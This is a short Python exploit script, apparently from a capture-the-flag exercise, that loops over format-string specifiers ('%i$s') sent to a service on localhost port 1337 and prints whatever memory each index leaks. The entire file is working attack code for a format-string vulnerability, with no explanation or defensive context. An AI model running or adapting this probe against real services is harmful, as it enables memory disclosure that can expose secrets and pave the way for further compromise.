from pwnie import *

context.log_level = 'error'
for i in range(0, 255):
    try:
        p = remote('0', 1337)

        sa(b'read\n', f'%{i}$s'.encode())
        ru(b'Will open:\n')

        data = rl()[:-1]
        print(f'[+] Data leak at index {i}: {data} ')

    except EOFError:
        close()
